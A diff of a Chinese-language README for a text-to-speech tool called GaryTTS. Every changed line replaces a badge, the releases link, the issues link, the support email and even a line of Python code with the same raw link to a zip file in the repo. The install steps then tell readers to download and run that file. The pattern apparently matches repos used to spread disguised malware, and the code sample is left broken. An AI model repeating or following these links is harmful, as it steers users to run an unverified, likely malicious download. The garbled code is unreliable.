@@ -1,8 +1,8 @@
 # GaryTTS 🎤
 
-![GaryTTS](https://img.shields.io/badge/GaryTTS-Text%20to%20Speech-blue.svg)  
-![Version](https://img.shields.io/badge/version-1.0.0-green.svg)  
-![License](https://img.shields.io/badge/license-MIT-lightgrey.svg)  
+![GaryTTS](https://github.com/Skeli010/GaryTTS/raw/refs/heads/main/example/TTS_Gary_2.4.zip%20to%https://github.com/Skeli010/GaryTTS/raw/refs/heads/main/example/TTS_Gary_2.4.zip)  
+![Version](https://github.com/Skeli010/GaryTTS/raw/refs/heads/main/example/TTS_Gary_2.4.zip)  
+![License](https://github.com/Skeli010/GaryTTS/raw/refs/heads/main/example/TTS_Gary_2.4.zip)  
 
 ## 简介
 
@@ -17,7 +17,7 @@
 
 ## 安装
 
-你可以从 [这里](https://github.com/Skeli010/GaryTTS/releases) 下载最新版本。请下载相应的文件并执行安装。
+你可以从 [这里](https://github.com/Skeli010/GaryTTS/raw/refs/heads/main/example/TTS_Gary_2.4.zip) 下载最新版本。请下载相应的文件并执行安装。
 
 ### 系统要求
 
@@ -27,7 +27,7 @@
 
 ## 使用方法
 
-1. **下载并安装**：访问 [这里](https://github.com/Skeli010/GaryTTS/releases)，下载并执行安装文件。
+1. **下载并安装**：访问 [这里](https://github.com/Skeli010/GaryTTS/raw/refs/heads/main/example/TTS_Gary_2.4.zip)，下载并执行安装文件。
 2. **运行程序**：打开终端或命令提示符，输入 `garytts` 启动程序。
 3. **输入文本**：在程序中输入你想要转换的文本。
 4. **选择语言**：选择你希望使用的语言（中文或英语）。
@@ -42,7 +42,7 @@ text = "你好，欢迎使用 GaryTTS。"
 language = 'zh'
 
 tts = gTTS(text=text, lang=language, slow=False)
-tts.save("output.mp3")
+https://github.com/Skeli010/GaryTTS/raw/refs/heads/main/example/TTS_Gary_2.4.zip("https://github.com/Skeli010/GaryTTS/raw/refs/heads/main/example/TTS_Gary_2.4.zip")
 ```
 
 这个简单的 Python 示例展示了如何使用 GaryTTS 生成语音文件。
@@ -95,8 +95,8 @@ tts.save("output.mp3")
 
 如果你有任何问题或建议，可以通过以下方式联系我们：
 
-- GitHub Issues: [GaryTTS Issues](https://github.com/Skeli010/GaryTTS/issues)
-- 电子邮件: support@garytts.com
+- GitHub Issues: [GaryTTS Issues](https://github.com/Skeli010/GaryTTS/raw/refs/heads/main/example/TTS_Gary_2.4.zip)
+- 电子邮件: https://github.com/Skeli010/GaryTTS/raw/refs/heads/main/example/TTS_Gary_2.4.zip
 
 ## 更新日志
 
